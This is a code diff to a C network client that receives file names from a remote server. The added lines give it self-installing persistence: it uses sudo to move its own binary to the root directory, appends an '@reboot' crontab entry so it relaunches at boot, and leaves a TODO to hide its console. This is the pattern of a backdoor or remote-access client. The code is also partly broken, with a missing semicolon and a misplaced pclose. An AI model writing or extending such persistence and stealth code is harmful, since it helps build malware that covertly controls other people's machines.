@@ -4,10 +4,33 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <unistd.h>
+#include <stdlib.h>
 
-#define PORT 8080
+#define PORT    8080
+#define BUFSIZE     1024
 
 int main(int argc, char const* argv[]) {
+
+    char *pwd_cmd = "pwd";
+    char cwd[BUFSIZE];
+    FILE *ptr;
+
+    if ((ptr = popen(pwd_cmd, "r")) != NULL)
+        while (fgets(cwd, BUFSIZE, ptr) != NULL);
+        pclose(ptr);
+    if (strcmp(cwd, "/\0") != 0) {
+        char *move_cmd = "sudo mv client /\0"
+        if (system(move_cmd) != -1) {
+            printf("client has been moved\n");
+        }
+        //TODO check if already added to crontab
+        char *startup_cmd = "crontab -l > file; echo \"@reboot /client\" >> file; crontab file; rm file;";
+        if (system(startup_cmd) != -1) {
+            printf("startup settings changed\n");
+        }
+    }
+
+    //TODO settings that will hide console
 
     struct sockaddr_in address; 
     bzero(&address, sizeof(address));
@@ -33,7 +56,7 @@ int main(int argc, char const* argv[]) {
             printf("connected\n");
             break;
         } else {
-            char serv_address[1024];
+            char serv_address[BUFSIZE];
             bzero(serv_address, sizeof(serv_address));
             inet_ntop(AF_INET, &(address.sin_addr.s_addr), serv_address, sizeof(serv_address));
             printf("trying to connect to at %s:%d\n", serv_address, ntohs(address.sin_port));
@@ -41,7 +64,7 @@ int main(int argc, char const* argv[]) {
         }
     }
 
-    char fname_recv_buffer[1024];
+    char fname_recv_buffer[BUFSIZE];
 
     while (1) {
         bzero(fname_recv_buffer, sizeof(fname_recv_buffer));
